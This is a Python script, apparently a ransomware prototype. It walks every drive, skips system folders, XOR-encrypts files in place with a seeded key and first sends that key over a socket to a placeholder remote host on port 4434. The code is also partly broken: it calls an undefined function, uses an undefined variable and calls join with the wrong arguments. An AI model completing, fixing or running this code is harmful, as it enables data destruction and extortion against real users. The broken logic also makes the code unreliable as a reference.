import os, string, random, sys, socket


def read_file_bytes(file_name):
    try:
        file = open(file_name,"rb")
        byte = file.read()
    except:
        print("test")
def enc_OS_files(ke):
    # set to none if not excluding anything
    exclusion_dir = ['Windows', 'XboxGames', 'OneDrive','system32']
    exclusion_fil = (['Windows', 'xbox'])
    if exclusion_dir is not None and len(exclusion_dir) > 0:
        for i, d in enumerate(exclusion_dir):
            exclusion_dir[i] = d.lower()
    if exclusion_fil is not None and len(exclusion_dir) > 0:
        for i, d in enumerate(exclusion_dir):
            exclusion_dir[i] = d.lower()
    exclusion_dir = list(exclusion_dir)
    print(exclusion_dir)
    available_drives = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]
    for x,y in enumerate(available_drives): available_drives[x] = y+"/"
    ct = 0
    files = []
    for drive in available_drives:
        for i, (dir_path, dirs, file_names) in enumerate(os.walk(drive, topdown=True)):
            if exclusion_dir is not None:
                for x in exclusion_dir:
                    for d in dirs:
                        if x in d.lower():
                            dirs.remove(d)
                    for f in file_names:
                        k = os.path.join(dir_path, f)
                        for x in exclusion_dir:
                            if not x in dir_path.lower() and k not in files:
                                enc_files(files,str(ke))
            else:
                k = os.path.join(dir_path, f)
                files.append(str(k))
    return k
def enc(x,txt):
    ok = []
    for i,y in enumerate(txt):
        b1 = x
        b2 = txt[i]
        ok.append(chr(ord(b1)^ord(b2)))
    return ok
def enc_file(f,k):
    random.seed(k)
    try:
        with open(f, "r+b") as f:
            while 1:
                print(f.tell())
                b = f.read(1)
                l = random.randbytes(1)
                f.seek(-1, 1)
                f.write(''.join(b,l))
    except Exception:
        print(f'couldn\'t open {f}')
        pass

    print(f'enc {f}')

def send_k(k,mhost):
    host = socket
    port = 4434
    client_socket = socket.socket()
    client_socket.connect((mhost,port))
    client_socket.send(str(k).encode())
    client_socket.close()
    print(0)

if __name__ == '__main__':
    k = ''
    if len(sys.argv) > 1 :
        k = sys.argv[1]
    else:
        k = 1000
    while not go:
        try:
            send_k(k,'HOSTNAME')
            go = True
        except ConnectionRefusedError:
            pass
    print(k)
    enc_OS_files(k)
    
